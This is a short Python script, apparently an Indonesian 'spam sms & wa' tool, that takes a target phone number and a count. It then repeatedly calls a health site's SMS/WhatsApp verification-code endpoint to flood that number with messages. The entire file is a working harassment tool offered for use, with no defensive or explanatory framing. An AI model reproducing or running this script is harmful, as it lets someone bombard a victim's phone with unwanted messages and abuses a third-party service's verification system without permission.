# coded : AkasakaID
# time : 01/06/2020
import requests,os
r = requests.Session()
os.system('cls' if os.name == 'nt' else 'clear')
print('spam sms & wa\nby AkasakaID\n')
nm = input('ex: 08..\nnomor target : ')
jm = int(input('jumlah : '))
jn = int(input('1.sms\n2.whatsapp\nnomor : '))
if jn == 1:
	tipe = 'Sms'
elif jn == 2:
	tipe = 'WhatsApp'
z = 1
for i in range(jm):
	r.get(f'https://passport.pedulisehat.id/v2/sms/captcha?mobile={nm}&mobile_country_code=62&channel={tipe}&_=1591017456479')
	print(f'{z}. spam send to {nm}')
	z += 1